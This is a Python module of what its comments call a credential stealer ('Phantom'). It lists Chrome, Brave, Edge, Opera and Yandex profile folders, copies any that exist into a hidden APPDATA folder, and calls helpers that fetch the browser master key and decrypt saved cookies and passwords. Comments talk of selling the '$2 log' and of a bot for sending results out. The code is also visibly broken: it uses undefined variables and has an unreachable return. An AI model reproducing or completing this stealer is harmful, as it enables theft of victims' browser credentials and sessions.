import main
import os
import shutil
from util.masterkey import MasterKeyFetcher
from util.decrypt import AES256Decrypt


def main_func():  # no need to be async anymore
    # you know what im probably just gonna end up making this telegram bot instead of discord bot
    paz = [
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Default\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Profile 1\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Profile 2\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Profile 3\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Profile 4\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Profile 5\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Guest Profile\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Default\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Profile 1\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Profile 2\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Profile 3\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Profile 4\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Profile 5\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Google\\Chrome\\User Data\\Guest Profile\\Network\\",
        f"{os.environ['APPDATA']}\\Opera Software\\Opera Stable\\",
        f"{os.environ['APPDATA']}\\Opera Software\\Opera GX Stable\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Profile 1\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Profile 2\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Profile 3\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Profile 4\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Profile 5\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Default\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Profile 1\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Profile 2\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Profile 3\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Profile 4\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Profile 5\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Guest Profile\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Default\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\",
        f"{os.environ['LOCALAPPDATA']}\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\"
    ]
    # credit to donerium for the paths, i don't want to go through the effort of finding them myself
    # although, later ill add paths that aren't in other stealers
    # so i can be unique
    # and not a copycat
    # skid skid skid
    # technically not skidding cuz its just file paths
    # and either way i converted them to python types so
    # i don't think it counts

    bf = []
    for path in paz:
        if os.path.exists(path):
            bf.append(path)
            shutil.copytree(path, f"{os.environ['APPDATA']}\\Phantom")  # we doin it like serpent babyyyyyy
            # i don't think i need to explain this
            # but i will
            # so basically
            # we check if the path exists
            # if it does
            # we copy it to the phantom folder
            # then we add it to the bf list
            # then we return the bf list
            # and then we will use the decrypter
            # and then we will decrypt the cookies and passwords
            # and then we have a good time with our $2 log
            # and then we will party! 
            master_keys = MasterKeyFetcher.get_master_keys(f"{os.environ['APPDATA']}\\Phantom")
            if master_keys is not None:
                decrypted_data = AES256Decrypt.decrypt_data(data, master_key)
                print(decrypted_data)
            else:
                print('no master key found. boowomp :(')
            # mr @ac2ro, gave me his cookies decrypter. but it's on discord
            # so i can't see it
            # so i mean, it probably won't work
                # im not a pythonista
                # i like c#
                # python is gross
                # slow and gross

            



    return bf
    
    # i have a really hate tolerance towards skids, but i still explain my code
    # just so if someone wants to skid, they can skid properly :)
    # and hey, if you understand how it works, it's not skidding anymore
    # it's learning
    # and learning is good
    #anyway

    # we get the master key    

    return f'{decrypted_data}'
    # works? lol probably not

# honestly I don't remember how i made this work
# nor can I be bothered to figure it out